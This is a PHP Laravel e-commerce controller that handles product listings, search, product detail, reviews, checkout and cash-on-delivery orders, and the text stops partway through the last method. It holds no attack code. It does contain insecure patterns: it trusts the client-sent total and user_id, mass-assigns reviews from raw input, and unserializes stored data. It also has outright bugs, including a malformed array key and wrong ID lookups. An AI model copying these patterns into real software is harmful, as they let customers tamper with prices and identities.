<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Advertise;
use App\Models\Banner;
use App\Models\Blog;
use App\Models\Brand;
use App\Models\Jazzcash;
use App\Models\Cart;
use App\Models\Gallery;
use App\Models\Category;
use App\Models\Childcategory;
use App\Classes\GeniusMailer;
use App\Models\Compare;
use App\Models\Conversation;
use App\Models\Counter;
use App\Models\Coupon;
use App\Models\Currency;
use App\Models\Faq;
use Exception;
use App\Models\Generalsetting;
use App\Models\Image;
use App\Models\Language;
use App\Models\Message;
use App\Models\VendorSubscription;
use App\Models\Notification;
use App\Models\FrenchiseNotification;
use App\Models\Order;
use App\Models\Page;
use App\Models\Pagesetting;
use App\Models\PaymentGateway;
use App\Models\Pickup;
use App\Models\Portfolio;
use App\Models\Product;
use App\Models\ProductClick;
use App\Models\Review;
use App\Models\Service;
use App\Models\Slider;
use App\Models\Subcategory;
use App\Models\Subscriber;
use App\Models\User;
use App\Models\UserSubscription;
use App\Models\UserNotification;
use App\Models\VendorOrder;
use Auth;
use Carbon\Carbon;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use Illuminate\Support\Str;

use DB;

class FrontendController extends Controller
{
   
 

    public function index(Request $request)
    {
         

        if(!empty($request->reff))
        {
            $affilate_user = User::where('affilate_code','=',$request->reff)->first();
            $brands = Brand::all();
            if(!empty($affilate_user))
            {
                $gs = Generalsetting::findOrFail(1);
                if($gs->is_affilate == 1)
                {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }

            }

        }

        $ads = Portfolio::all();
        foreach($ads as $ad)
        {
 
        	$ad->image_path=asset('assets/images/'.$ad->photo);
        }
        
        $sls = Slider::first();
        $id1 = $sls->id;
        
        //$sliders = Slider::where('id','>',$id1)->get();
        $sliders = Slider::all();
        foreach($sliders as $ad)
        {
 
        	$ad->image_path=asset('assets/images/'.$ad->photo);
        }
      
        $brands   = Brand::all();
         foreach($brands as $ad)
        {
 
        	$ad->image_path=asset('assets/images/'.$ad->photo);
        }
        $top_shop = user::where('top','=',1)->get();
          foreach($top_shop as $ad)
        {
 
        	$ad->image_path=asset('assets/images/'.$ad->photo);
        }
        $nav_shop = User::where('nav_shop','=',1)->get(); 

         foreach($nav_shop as $ad)
        {
 
        	$ad->image_path=asset('assets/images/'.$ad->photo);
        }


        $banner   = Banner::findOrFail(1);

        $banner->top1=asset('assets/images/'.$banner->top1);
        $banner->top2=asset('assets/images/'.$banner->top2);
        $banner->top3=asset('assets/images/'.$banner->top3);
        $banner->top4=asset('assets/images/'.$banner->top4);
        $services = Service::all();
        
        //   print_r($top_shop); exit;
        $allproducts = Product::where('status','=',1)->orderBy('id','desc')->take(8)->get();
        foreach($allproducts as $ad)
        {
            $ad->ratings=(Review::ratings($ad->id))/20;
 
        	$ad->image_path=asset('assets/images/'.$ad->photo);
        }
        $fproducts = Product::where('featured','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
         foreach($fproducts as $ad)
        {
            $ad->ratings=Review::ratings($ad->id);
 
        	$ad->image_path=asset('assets/images/'.$ad->photo);
        }
        $beproducts = Product::where('best','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
         foreach($beproducts as $ad)
        {
 
        	$ad->image_path=asset('assets/images/'.$ad->photo);
        }
        $tproducts = Product::where('top','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
         foreach($tproducts as $ad)
        {
            $ad->ratings=Review::ratings($ad->id);
 
        	$ad->image_path=asset('assets/images/'.$ad->photo);
        }

        $hproducts = Product::where('hot','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
         foreach($hproducts as $ad)
        {
            $ad->ratings=Review::ratings($ad->id);
        	$ad->image_path=asset('assets/images/'.$ad->photo);
        }
        $lproducts = Product::where('latest','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
         foreach($lproducts as $ad)
        {
            $ad->ratings=Review::ratings($ad->id);
 
        	$ad->image_path=asset('assets/images/'.$ad->photo);
        }
        $biproducts = Product::where('big','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
         foreach($biproducts as $ad)
        {
            $ad->ratings=Review::ratings($ad->id);
 
        	$ad->image_path=asset('assets/images/'.$ad->photo);
        }
        $imgs = Image::all();
         foreach($imgs as $ad)
        {
 
        	$ad->image_path=asset('assets/images/'.$ad->photo);
        }
        if(1>1)  
        {
         
          return response()->json([
            'status_code' => 500,
            'status' => 0,
            'message' => 'Your Code has been expire please click on resend button to receive a fresh code',
          ]);
        } 
  
    return response()->json([
      'status_code' => 200,
      'status' => 1,
      'adds'=>$ads,
      'slider'=>$sls,
      'sliders'=>$sliders,
      'brands'=>$brands,
      'topShops'=>$top_shop,
      'navbarShops'=>$sliders,
      'banner'=>$banner,
      'services'=>$services,
      'feature_products'=>$fproducts,
      'top_products'=>$tproducts,
      'best_products'=>$beproducts,
      'hot_products'=>$hproducts,
      'latest_products'=>$lproducts,
      'all_products'=>$allproducts,
      'images'=>$imgs,

    ]);
        
    }
    public function getsearch(Request $request)
    {
        
        $pros='';
      
        if(!empty($request->cat_id))
        {
            $cat = Category::where('id','=',$request->cat_id)->first();
            if($cat)
            {
                $pros = $cat->products()->where('status','=',1)->orderBy('id','desc')->get();
            }
           
           
           
        }

        if(!empty($request->subcat_id))
        {
            $cat = SubCategory::where('id','=',$request->cat_id)->first();
            
            if($cat)
            $pros = $cat->products()->where('status','=',1)->orderBy('id','desc')->get();
           
        }

        if(!empty($request->childcat_id))
        {
            $cat = ChildCategory::where('id','=',$request->cat_id)->first();
            if($cat)
            $pros = $cat->products()->where('status','=',1)->orderBy('id','desc')->get();
           
        }
        
        if(!empty($request->min) || !empty($request->max))
        {
        $min = $request->min;
        if(empty($request->min))
        {
            
            $min = 0;
        }
        $max = $request->max;
        if(empty($request->max))
        {
            
            $max = Product::max('cprice');
        }
  
        // print_r($min); exit;
        if($cat)
        {
            $pros = $cat->products()->where('status','=',1)->whereBetween('cprice', [$min, $max])->orderBy('cprice','asc')->get();
        }
       
         else
         {
            $pros=Product::where('status','=',1)->whereBetween('cprice', [$min, $max])->orderBy('cprice','asc')->get(); 
         }
         
    }
    if(!count($pros))  
    {
     
      return response()->json([
        'status_code' => 500,
        'status' => 0,
        'message' => 'No product Found',
      ]);
    }
    
     foreach($pros as $row)
    {

        $row->image_path=asset('assets/images/'.$row->photo);
    }

return response()->json([
  'status_code' => 200,
  'status' => 1,
  'categories'=>$pros,

]);
}

    public function getcategories()
    {
        $cats = Category::all();
        if(!$cats)  
        {
         
          return response()->json([
            'status_code' => 500,
            'status' => 0,
            'message' => 'No category Found',
          ]);
        }
        
         foreach($cats as $row)
        {
 
        	$row->image_path=asset('assets/images/'.$row->photo);
        }
  
    return response()->json([
      'status_code' => 200,
      'status' => 1,
      'categories'=>$cats,

    ]);
        
    }
    public function getsubcategories(Request $request)
    {
        $id = $request->input('category_id');
        $subcats = Subcategory::where('category_id','=',$id)->get();
        if(!$subcats)  
        {
         
          return response()->json([
            'status_code' => 500,
            'status' => 0,
            'message' => 'No Subcategory Found',
          ]);
        } 
  
    return response()->json([
      'status_code' => 200,
      'status' => 1,
      'subcategories'=>$subcats,

    ]);           
    }  

    public function childcats(Request $request)
    {
        $id = $request->input('subcategory_id');
        $childcats = Childcategory::where('subcategory_id','=',$id)->get();
        if(!$childcats)  
        {
        return response()->json([
            'status_code' => 500,
            'status' => 0,
            'message' => 'No Child Category Found',
          ]);
        } 
  
    return response()->json([
      'status_code' => 200,
      'status' => 1,
      'childcategories'=>$childcats,

    ]);             
    } 
  public function index1(Request $request ,$id)
    {
       

        if(!empty($request->reff))
        {
            $affilate_user = User::where('affilate_code','=',$request->reff)->first();
            if(!empty($affilate_user))
            {
                $gs = Generalsetting::findOrFail(1);
                if($gs->is_affilate == 1)
                {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }

            }

        }

        $ads = Portfolio::all();
        $sls = Slider::first();
        $id1 = $sls->id;
        $sliders = Slider::where('id','>',$id1)->get();
        $brands = Brand::all();
        $banner = Banner::findOrFail(1);
        $services = Service::all();
        $fproducts = Product::where('featured','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
        $beproducts = Product::where('best','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
        $tproducts = Product::where('top','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
        $hproducts = Product::where('hot','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
        $lproducts = Product::where('latest','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
        $biproducts = Product::where('big','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
        $imgs = Image::all();
        return view('front.index1',compact('ads','sls','sliders','brands','banner','fproducts','beproducts','tproducts','hproducts','lproducts','biproducts','imgs','services','id'));
    }


    public function extraIndex(Request $request)
	{

            $ads = Portfolio::all();
            $sls = Slider::first();
            $id1 = $sls->id;
            $sliders = Slider::where('id','>',$id1)->get();
            $brands = Brand::all();
            $banner = Banner::findOrFail(1);
            $services = Service::all();
            $nav_shop = User::where('nav_shop','=',1)->get(); 
            $top_shop_cat = user::where('top_by_category','=',1)->take(8)->get();
            $fproducts = Product::where('featured','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
            $beproducts = Product::where('best','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
            $tproducts = Product::where('top','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
            $hproducts = Product::where('hot','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
            $lproducts = Product::where('latest','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
            $biproducts = Product::where('big','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
            $imgs = Image::all();

            ///zee/////

              $cate          = Category::where('type',"1")->get();
              foreach($cate as $key)
              {
               $key->sub_cate     = Subcategory::where('category_id',$key->id)->get(); 
               $key->ct_media     = DB::table('type_banner')->where('tb_ct_id',$key->id)->where('tb_status',1)->first();
               $key->bner_product = Product::where('category_id',$key->id)->take(6)->get();
              }
              // $sub_cate     = Subcategory::where('category_id',$cate->id)->get();
              // $ct_media     = DB::table('type_banner')->where('tb_ct_id',$cate->id)->first();
              // $bner_product = Product::where('category_id',$cate->id)->take(6)->get();
// print_r($cate);
// exit;

            return view('front.extraindex',compact('top_shop_cat','nav_shop','ads','sls','sliders','brands','banner','fproducts','beproducts','tproducts','hproducts','lproducts','biproducts','imgs','services','cate'));
	}

        public function category_index(Request $request,$id)
    {

            $ads        = Portfolio::all();
            $sls        = Slider::first();
            $id1        = $sls->id;
            $sliders    = Slider::where('id','>',$id1)->get();
            $brands     = Brand::all();
            $banner     = Banner::findOrFail(1);
            $services   = Service::all();
            $fproducts  = Product::where('featured','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
            $beproducts = Product::where('best','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
            $tproducts  = Product::where('top','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
            $hproducts  = Product::where('hot','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
            $lproducts  = Product::where('latest','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
            $biproducts = Product::where('big','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
            $imgs       = Image::all();

            ///zee/////

              $cate         = Category::where('type',"1")->first();
              $sub_cate     = Subcategory::where('category_id',$cate->id)->get();
              $ct_media     = DB::table('type_banner')->where('tb_ct_id',$cate->id)->first();
              $bner_product = Product::where('subcategory_id',$id)->take(6)->get();
// print_r($sub_cate);
// exit;

            return view('front.category_index',compact('ads','sls','sliders','brands','banner','fproducts','beproducts','tproducts','hproducts','lproducts','biproducts','imgs','services','cate','ct_media','bner_product','sub_cate'));
    }

    public function lang($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }


    public function currency($id)
    {
        Session::put('currency', $id);
        return redirect()->back();
    }

    public function category(Request $request,$slug)
    {
        $sort = "";
        $cat = Category::where('cat_slug','=',$slug)->first();

        $cats = $cat->products()->where('status','=',1)->orderBy('id','desc')->paginate(9);
        if(!empty($request->min) || !empty($request->max))
        {
        $min = $request->min;
        // print_r($min); exit;
        $max = $request->max;
        $cats = $cat->products()->where('status','=',1)->whereBetween('cprice', [$min, $max])->orderBy('cprice','asc')->paginate(9);
        return view('front.category',compact('cat','cats','sort','min','max'));
        }
        return view('front.category',compact('cat','sort','cats'));
    }

    public function categorysort($slug,$sorted)
    {
        $sort = $sorted;
        $cat = Category::where('cat_slug','=',$slug)->first();
        if($sort == "new")
        {
        $cats = $cat->products()->where('status','=',1)->orderBy('id','desc')->paginate(9);
        }
        else if($sort == "old")
        {
        $cats = $cat->products()->where('status','=',1)->paginate(9);
        }
        else if($sort == "low")
        {
        $cats = $cat->products()->where('status','=',1)->orderBy('cprice','asc')->paginate(9);
        }
        else if($sort == "high")
        {
        $cats = $cat->products()->where('status','=',1)->orderBy('cprice','desc')->paginate(9);
        }
        return view('front.category',compact('cat','cats','sort'));
    }

    public function subcategory(Request $request,$slug)
    {
        $sort = "";
        $subcat = Subcategory::where('sub_slug','=',$slug)->first();
        $subcats = $subcat->products()->where('status','=',1)->orderBy('id','desc')->paginate(9);
        if(!empty($request->min) || !empty($request->max))
        {
        $min = $request->min;
        $max = $request->max;
        $subcats = $subcat->products()->where('status','=',1)->whereBetween('cprice', [$min,$max])->orderBy('cprice','asc')->paginate(9);
        return view('front.subcategory',compact('subcat','subcats','sort','min','max'));
        }

        return view('front.subcategory',compact('subcat','sort','subcats'));
    }

    public function subcategorysort($slug,$sorted)
    {
        $sort = $sorted;
        $subcat = Subcategory::where('sub_slug','=',$slug)->first();
        if($sort == "new")
        {
        $subcats = $subcat->products()->where('status','=',1)->orderBy('id','desc')->paginate(9);
        }
        else if($sort == "old")
        {
        $subcats = $subcat->products()->where('status','=',1)->paginate(9);
        }
        else if($sort == "low")
        {
        $subcats = $subcat->products()->where('status','=',1)->orderBy('cprice','asc')->paginate(9);
        }
        else if($sort == "high")
        {
        $subcats = $subcat->products()->where('status','=',1)->orderBy('cprice','desc')->paginate(9);
        }
        return view('front.subcategory',compact('subcat','subcats','sort'));
    }

    public function childcategory(Request $request,$slug)
    {
        $sort = "";
        $childcat = Childcategory::where('child_slug','=',$slug)->first();
        $childcats = $childcat->products()->where('status','=',1)->orderBy('id','desc')->paginate(9);
        if(!empty($request->min) || !empty($request->max))
        {
            $min = $request->min;
            $max = $request->max;
            $childcats = $childcat->products()->where('status','=',1)->whereBetween('cprice', [$min,$max])->orderBy('cprice','asc')->paginate(9);
            return view('front.childcategory',compact('childcat','childcats','sort','min','max'));
        }

        return view('front.childcategory',compact('childcat','childcats','sort'));
    }

    public function childcategorysort($slug,$sorted)
    {
        $sort = $sorted;
        $childcat = Childcategory::where('child_slug','=',$slug)->first();
        if($sort == "new")
        {
        $childcats = $childcat->products()->where('status','=',1)->orderBy('id','desc')->paginate(9);
        }
        else if($sort == "old")
        {
        $childcats = $childcat->products()->where('status','=',1)->paginate(9);
        }
        else if($sort == "low")
        {
        $childcats = $childcat->products()->where('status','=',1)->orderBy('cprice','asc')->paginate(9);
        }
        else if($sort == "high")
        {
        $childcats = $childcat->products()->where('status','=',1)->orderBy('cprice','desc')->paginate(9);
        }
        return view('front.childcategory',compact('childcat','childcats','sort'));
    }

    public function product(Request $request) 
    {
                $id=$request->input('product_id');
                $product = Product::find($id);
                $product->qty=1;
                 //$product->ratings=Review::ratings($product->id);
                 $rating=(Review::ratings($product->id))/20;
             
               try{
                
          
                    $product->photo =  asset('assets/images/'.$product->photo);   
                if($product->size != null)
                {
                    $ps =  explode(',', $product->size);
                    $rps = [];
                    $sizefinel =[];
                    foreach ($ps as $key ) { 
                           $rps['selectsize']=$key;
                           $rps['isselct']='false';
                           array_push($sizefinel, $rps);
                    } 
                    $product->size  =  $sizefinel;                       
                }
                if($product->color != null)
                {
                     $pc =    explode(',', $product->color); 
                     $rpc = [];
                    $colorfinel =[];
                    foreach ($pc as $key ) { 
                           $rps['selectsize']=$key; 
                           $rps['isselct']='false';
                           array_push($colorfinel, $rps);
                    } 
                    $product->color =  $colorfinel;                
                }
                if($product->size == null)
                {
                   $product->size = null ;
                }
                if($product->color == null)
                {
                   $product->color = null;            
                }
                
               
                
             
                $pview = $product->views+=1;
                product::where('id',$product->id)->update(['views'=>$pview]);   
                $product_click =  new ProductClick;
                $product_click->product_id = $product->id;
                $product_click->date = Carbon::now()->format('Y-m-d');
                $product_click->save(); 
                $pmeta = $product->tags;
               //  print_r($product); exit;
                $vendor = User::where('id','=',$product->user_id)->first();
              
                if(empty($product))  
                {
                 
                  return response()->json([
                    'status_code' => 500,
                    'status' => 0,
                    'message' => 'No category Found',
                  ]);
                } 
                
                 $gallery = Gallery::where('product_id',$product->id)->get();
                if(count($gallery)>0)
                {
                    $img = array();
                    foreach($gallery as $g)
                    {
                      array_push($img,asset('assets/images/gallery/'.$g->photo));
                    }
                  $product->gallery=$img;  
                }
                else
                {
                    $product->gallery= null;  
                }
               
                
                 if(!empty($vendor))
                { 
                    return response()->json([
                        'status_code' => 200,
                        'status' => 1,
                        'rating'=>$rating,
                        'image_base'=>asset('assets/images/'),
                        'product' => $product, 
                        'meta' => (object)$pmeta, 
                        'vendor' => $vendor,
                       
                      ]);    
                }
              
                
                
          
            return response()->json([

                    'status_code' => 200,
                    'status' => 1,
                    'quantity'=>1,
                    'rating'->$rating,
                    'image_base'=>asset('assets/images/'),
                    'product' => $product, 
                    'meta' => (object)$pmeta, 
                    
                

            ]);
           } catch (Exception $error) {
            return response()->json([
                'status_code' => 500,
                'status' => 0,
                'message' => 'no data found',
              ]);
          } 

    }

    public function cart()
    {
        if (!Session::has('cart')) {
            return view('front.cart');
        }
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);
        $products = $cart->items;
        return view('front.cart', ['products' => $cart->items, 'totalPrice' => $cart->totalPrice]); 
    }


    public function compare()
    {
        if (!Session::has('compare')) {
            return view('front.compare');
        }
        $oldCompare = Session::get('compare');
        $compare = new Compare($oldCompare);
        $products = $compare->items;
        return view('front.compare', compact('products')); 
    }
    //Submit Review
    //Submit Review
    public function reviewsubmit(Request $request)
    {
        $ck = 0;
$orders = Order::where('user_id','=',$request->user_id)->where('status','=','completed')->get();

        foreach($orders as $order)
        {
        $cart = unserialize(gzuncompress(utf8_decode($order->cart)));
            foreach($cart->items as $product)
            {
                if($request->product_id == $product['item']['id'])
                {
                    $ck = 1;
                    break;
                }
            }
        }
        if($ck == 1)
        {
            $user = Auth::guard('user')->user();
            $prev = Review::where('product_id','=',$request->product_id)->where('user_id','=',$user->id)->get();
            if(count($prev) > 0)
            {
            return redirect()->back()->with('unsuccess','You Have Reviewed Already.');                
            }         
            $review = new Review;
            $review->fill($request->all());
            $review['review_date'] = date('Y-m-d H:i:s');
            $review->save();
            return redirect()->back()->with('success','Your Review Submitted Successfully.');
        }
        else{
            return redirect()->back()->with('unsuccess','Buy This Product First');
        }


    }

    //Submit Review
    public function tags($tag)
    {
       $products = Product::where('tags', 'like', '%' . $tag . '%')
                ->where('status','=',1)->paginate(12);
       return view('front.tags', compact('products','tag'));
    }

    public function search(Request $request)
    {
      
       $data=$this->validate($request,array(
           'product'=>'required',

       ));
       $search = $request->product;
       
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')
                ->get();

                if(!count($sproducts))  
                {
                 
                  return response()->json([
                    'status_code' => 500,
                    'status' => 0,
                    'message' => 'No product Found',
                    'search'=>$search,
                    'products'=>$sproducts,
                  ]);
                }
                
                 foreach($sproducts as $row)
                {
                    $row->ratings=Review::ratings($row->id);
            
                    $row->image_path=asset('assets/images/'.$row->photo);
                }
            
            return response()->json([
              'status_code' => 200,
              'status' => 1,
              'message' => 'search products',
              'search'=>$search,
              'products'=>$sproducts,
            
            ]);
      
    }

    public function searchs(Request $request)
    {
       $sort = "";
       
        $product  = $request->product;
        $min      = $request->min;
        $max      = $request->max; 
        $sproducts = Product::where('status','=',1)
                              ->where('name', 'like', '%' . $product . '%') 
                              ->whereBetween('cprice', [$min,$max])
                              ->orderBy('cprice','asc')->get();
           if(!count($sproducts))  
                {
                 
                  return response()->json([
                    'status_code' => 500,
                    'status' => 0,
                    'message' => 'No product Found',
                    'search'=>$product,
                    'products'=>$sproducts,
                  ]);
                }
                
                 foreach($sproducts as $row)
                {
                    $row->ratings=Review::ratings($row->id);
            
                    $row->image_path=asset('assets/images/'.$row->photo);
                }
            
            return response()->json([
              'status_code' => 200,
              'status' => 1,
              'message' => 'search products',
              'search'=>$product,
              'products'=>$sproducts,
            
            ]);
    }

    public function searchss(Request $request, $search, $sort)
    {
        if($sort == "new")
        {
        if(!empty($request->min) || !empty($request->max))
        {
        $min = $request->min;
        $max = $request->max;
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min,$max])->orderBy('id','desc')->paginate(9);

        return view('front.searchpricesort',compact('sproducts','search','sort','min','max'));
        }
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')
                ->orderBy('id','desc')->paginate(9);
        }
        else if($sort == "old")
        {
        if(!empty($request->min) || !empty($request->max))
        {
        $min = $request->min;
        $max = $request->max;
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min,$max])->paginate(9);

        return view('front.searchpricesort',compact('sproducts','search','sort','min','max'));
        }
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->paginate(9);
        }
        else if($sort == "low")
        {
        if(!empty($request->min) || !empty($request->max))
        {
        $min = $request->min;
        $max = $request->max;
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min,$max])->orderBy('cprice','asc')->paginate(9);

        return view('front.searchpricesort',compact('sproducts','search','sort','min','max'));
        }
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')
                ->orderBy('cprice','asc')->paginate(9);
        }
        else if($sort == "high")
        {
        if(!empty($request->min) || !empty($request->max))
        {
        $min = $request->min;
        $max = $request->max;
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min,$max])->orderBy('cprice','desc')->paginate(9);

        return view('front.searchpricesort',compact('sproducts','search','sort','min','max'));
        }
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')
                ->orderBy('cprice','desc')->paginate(9);
        }
       return view('front.searchproductsort', compact('sproducts','search','sort'));
    }
    


    public function checkout()
    {
        
        if (!Session::has('cart')) {
            // print_r('cheout'); exit;
            return redirect()->route('front.cart')->with('success',"You don't have any product to checkout.");
        }
        if (Session::has('already')) {
            Session::forget('already');
        }
        $gs = Generalsetting::findOrFail(1);
        $dp = 1;

// If a user is Authenticated then there is no problm user can go for checkout

        if(Auth::guard('user')->check())
        {
                $gateways =  PaymentGateway::where('status','=',1)->get();
                $pickups = Pickup::all();
                $oldCart = Session::get('cart');
                $cart = new Cart($oldCart);
                $products = $cart->items;
                if($gs->multiple_ship == 1)
                {
                    $user = null;
                    foreach ($cart->items as $prod) {
                            $user[] = $prod['item']['user_id'];
                    }
                    $ship  = 0;
                    $users = array_unique($user);
                    if(!empty($users))
                    {
                       foreach ($users as $user) {
                        if($user != 0){
                              $nship = User::findOrFail($user);
                                 $ship += $nship->shipping_cost;
                        }
                        else {
                             $ship  += $gs->ship;
                        }

                       }
                    }

                }
                else{
                $ship  = $gs->ship;
                }

                foreach ($products as $prod) {
                    if($prod['item']['type'] == 0)
                    {
                        $dp = 0;
                        break;
                    }
                }
                if($dp == 1)
                {
                $ship  = 0;                    
                }
                $total = $cart->totalPrice + $ship;
                if($gs->tax != 0)
                {
                    $tax = ($total / 100) * $gs->tax;
                    $total = $total + $tax;
                }
        return view('front.checkout', ['products' => $cart->items, 'totalPrice' => $total, 'pickups' => $pickups, 'totalQty' => $cart->totalQty, 'gateways' => $gateways, 'shipping_cost' => $ship, 'digital' => $dp]);             
        }

        else

        {
// If guest checkout is activated then user can go for checkout
                    if($gs->guest_checkout == 1)
                    {
                $gateways =  PaymentGateway::where('status','=',1)->get();
                $pickups = Pickup::all();
                $oldCart = Session::get('cart');
                $cart = new Cart($oldCart);
                $products = $cart->items;
                if($gs->multiple_ship == 1)
                {
                    $user = null;
                    foreach ($cart->items as $prod) {
                            $user[] = $prod['item']['user_id'];
                    }
                    $ship  = 0;
                    $users = array_unique($user);
                    if(!empty($users))
                    {
                       foreach ($users as $user) {
                        if($user != 0){
                              $nship = User::findOrFail($user);
                                 $ship += $nship->shipping_cost;
                        }
                        else {
                             $ship  += $gs->ship;
                        }

                       }
                    }

                }
                else{
                $ship  = $gs->ship;
                }
                foreach ($products as $prod) {
                    if($prod['item']['type'] == 0)
                    {
                        $dp = 0;
                        break;
                    }
                }
                if($dp == 1)
                {
                $ship  = 0;                    
                }
                $total = $cart->totalPrice + $ship;
                if($gs->tax != 0)
                {
                    $tax = ($total / 100) * $gs->tax;
                    $total = $total + $tax;
                }
                foreach ($products as $prod) {
                    if($prod['item']['type'] != 0)
                    {
                        if(!Auth::guard('user')->check())
                        {
                $ck = 1;
        return view('front.checkout', ['products' => $cart->items, 'totalPrice' => $total, 'pickups' => $pickups, 'totalQty' => $cart->totalQty, 'gateways' => $gateways, 'shipping_cost' => $ship, 'checked' => $ck, 'digital' => $dp]);  
                        }
                    }
                }
        return view('front.checkout', ['products' => $cart->items, 'totalPrice' => $total, 'pickups' => $pickups, 'totalQty' => $cart->totalQty, 'gateways' => $gateways, 'shipping_cost' => $ship, 'digital' => $dp]);                 
                    }

// If guest checkout is Deactivated then display pop up form with proper error message

                    else{
                $gateways =  PaymentGateway::where('status','=',1)->get();
                $pickups = Pickup::all();
                $oldCart = Session::get('cart');
                $cart = new Cart($oldCart);
                $products = $cart->items;
                if($gs->multiple_ship == 1)
                {
                    $user = null;
                    foreach ($cart->items as $prod) {
                            $user[] = $prod['item']['user_id'];
                    }
                    $ship  = 0;
                    $users = array_unique($user);
                    if(!empty($users))
                    {
                       foreach ($users as $user) {
                        if($user != 0){
                              $nship = User::findOrFail($user);
                                 $ship += $nship->shipping_cost;
                        }
                        else {
                             $ship  += $gs->ship;
                        }

                       }
                    }

                }
                else{
                $ship  = $gs->ship;
                }

                $total = $cart->totalPrice + $ship;
                if($gs->tax != 0)
                {
                    $tax = ($total / 100) * $gs->tax;
                    $total = $total + $tax;
                }
                $ck = 1;
        return view('front.checkout', ['products' => $cart->items, 'totalPrice' => $total, 'pickups' => $pickups, 'totalQty' => $cart->totalQty, 'gateways' => $gateways, 'shipping_cost' => $ship, 'checked' => $ck, 'digital' => $dp]);                 
                    }
                    


        }


    }

    public function cashondelivery(Request $request)
    {
        // echo '<pre>';
        // print_r(Session::get('cart'));
        // exit;
        if (!Session::has('cart')) {
            return redirect()->route('front.cart')->with('success',"You don't have any product to checkout.");
        }
            if (Session::has('currency')) 
            {
              $curr = Currency::find(Session::get('currency'));
            }
            else
            {
                $curr = Currency::where('is_default','=',1)->first();
            }
        $gs = Generalsetting::findOrFail(1);
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);
        foreach($cart->items as $key => $prod)
        {
        if($prod['item']['license']!=null && $prod['item']['license_qty']!=null)
        {
            $details1 = explode(',', $prod['item']['license_qty']);
                foreach($details1 as $ttl => $dtl)
                {
                    if($dtl != 0)
                    {
                        $dtl--;
                        $produc = Product::findOrFail($prod['item']['id']);
                        $temp = explode(',', $produc->license_qty);
                        $temp[$ttl] = $dtl;
                        $final = implode(',', $temp);
                        $produc->license_qty = $final;
                        $produc->update();
                        $temp = explode(',,', $produc->license);
                        $license = $temp[$ttl];
         $oldCart = Session::has('cart') ? Session::get('cart') : null;
         $cart = new Cart($oldCart);
         $cart->updateLicense($prod['item']['id'],$license);  
         Session::put('cart',$cart);
                        break;
                    }                    
                }
        }
        }
        $order = new Order;
        //$success_url = action('PaymentController@payreturn');
        $item_name = $gs->title." Order";
        $item_number = str::random(4).time();
        $order['user_id'] = $request->user_id;
        
        $order['cart'] = utf8_encode(gzcompress(serialize($cart), 9)); 
        $order['totalQty'] = $request->totalQty;
        $order['pay_amount'] = round($request->total / $curr->value, 2);
        $order['method'] = "Cash On Delivery";
        $order['shipping'] = $request->shipping;
        $order['pickup_location'] = $request->pickup_location;
        $order['customer_email'] = $request->email;
        $order['customer_name'] = $request->name;
        $order['shipping_cost'] = $request->shipping_cost;
        $order['tax'] = $request->tax;
        $order['customer_phone'] = $request->phone;
        $order['order_number'] = str::random(4).time();
        $order['customer_address'] = $request->address;
        $order['customer_country'] = $request->customer_country;
        $order['customer_city'] = $request->city;
        $order['customer_zip'] = $request->zip;
        $order['shipping_email'] = $request->shipping_email;
        $order['shipping_name'] = $request->shipping_name;
        $order['shipping_phone'] = $request->shipping_phone;
        $order['shipping_address'] = $request->shipping_address;
        $order['shipping_country'] = $request->shipping_country;
        $order['shipping_city'] = $request->shipping_city;
        $order['shipping_zip'] = $request->shipping_zip;
        $order['order_note'] = $request->order_notes;
        $order['coupon_code'] = $request->coupon_code;
        $order['coupon_discount'] = $request->coupon_discount;
        $order['dp'] = $request->dp;
        $order['payment_status'] = "Pending";
        $order['currency_sign'] = $curr->sign;
        $order['currency_value'] = $curr->value;

            if (Session::has('affilate')) 
            {
                $val = $request->total / 100;
                $sub = $val * $gs->affilate_charge;
                $user = User::findOrFail(Session::get('affilate'));
                $user->affilate_income = $sub;
                $user->update();
                $order['affilate_user'] = $user->name;
                $order['affilate_charge'] = $sub;
            }
        $order->save();
